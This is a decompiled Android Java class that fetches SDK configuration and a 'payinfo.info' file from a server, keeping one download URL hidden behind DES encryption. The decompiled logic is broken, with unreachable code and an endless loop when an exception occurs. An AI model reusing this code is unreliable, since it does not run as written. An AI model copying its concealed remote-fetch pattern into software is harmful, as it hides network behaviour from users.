package com.yl.ml.thread;

import android.content.Context;
import com.yl.codelib.comm.MyPreference;
import com.yl.codelib.encryption.DESEncryptor;
import com.yl.codelib.utils.FileUtil;
import com.yl.codelib.utils.HttpConnent;
import com.yl.codelib.utils.LogUtil;
import com.yl.ml.common.CacheHelper;
import com.yl.ml.date.ConFigFile;
import java.io.UnsupportedEncodingException;
import org.json.JSONObject;

public class GetSdkInfoThread
  extends BaseHttpThread
{
  private Context aU;
  
  public GetSdkInfoThread(Context paramContext)
  {
    this.aU = paramContext;
  }
  
  public void run()
  {
    Object localObject1 = new MyPreference(this.aU);
    Object localObject2 = HttpConnent.doHttpPost(ConFigFile.Url_JSMain + "/initInfoNew.jsp", 0);
    if (!((String)localObject2).equals("NO")) {}
    try
    {
      localObject2 = new JSONObject((String)localObject2);
      ((MyPreference)localObject1).write("TIME_YZMWAIT", ((JSONObject)localObject2).getLong("TIME_YZMWAIT"));
      ((MyPreference)localObject1).write("inspackage_infos", ((JSONObject)localObject2).getString("inspackage_infos"));
      ((MyPreference)localObject1).write("Service_Num", ((JSONObject)localObject2).getString("Service_Num"));
      ((MyPreference)localObject1).write("ZC_BD_PORT", ((JSONObject)localObject2).getString("ZC_BD_PORT"));
      ((MyPreference)localObject1).write("Ado_CNAME", ((JSONObject)localObject2).getString("Ado_CNAME"));
      ((MyPreference)localObject1).write("Ado_CM", ((JSONObject)localObject2).getString("Ado_CM"));
      switch (CacheHelper.caCheAvailability_Local(this.aU, "payinfo.info", 0L))
      {
      default: 
        return;
      }
      localObject1 = HttpConnent.doHttpPost(DESEncryptor.getDec("/eS6kcNlKagYU1UbOIc0hmeD7cVGwPgomhBlES1773aPyHxjVCqFgc0PhGoabFUfDAs8blpEEWo="), 0);
      LogUtil.v((String)localObject1);
      try
      {
        FileUtil.writeDateFile("payinfo.info", ((String)localObject1).getBytes("utf-8"), this.aU);
        return;
      }
      catch (UnsupportedEncodingException localUnsupportedEncodingException) {}
    }
    catch (Exception localException)
    {
      for (;;) {}
    }
  }
}
